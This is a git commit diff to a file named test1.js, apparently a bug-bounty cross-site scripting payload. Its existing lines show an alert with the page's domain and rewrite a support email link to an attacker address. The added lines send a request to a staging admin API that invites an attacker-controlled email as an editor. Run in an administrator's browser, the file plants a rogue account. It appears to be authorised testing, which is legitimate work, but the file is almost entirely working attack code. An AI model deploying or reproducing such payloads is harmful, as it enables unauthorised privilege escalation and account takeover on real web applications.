274165db2f4c1ed172bc20df88744191da2aa2bd
gtrfsec <104921988+gtrfsec@users.noreply.github.com>
2022-05-04 18:11:06 +0100

    Update test1.js

--- test1.js
+++ test1.js
@@ -1,2 +1,27 @@
 alert("Hello from Javascript for domain "+document.domain);
 document.getElementById('support_email').href="mailto:badguy@badguy.com";
+
+
+let url = "https://adminbc.tsec-stg.com/api/v1/admins/send-invite";
+let headers = {
+    'Accept': 'application/json',
+    'Content-Type': 'application/json'
+};
+
+jsonObj={"email":"gtrf+badguy@bugcrowdninja.com", "role":"editor"}
+
+async function makePostRequest(url, requestType, headers){
+    await fetch(
+        url,
+        {
+            method: requestType,
+            headers: headers,
+            body: JSON.stringify(jsonObj)
+        },
+    ).then(async rawResponse =>{
+        var content = await rawResponse.json()
+        console.log(content);
+    });
+}
+
+makePostRequest(url, "POST", headers);
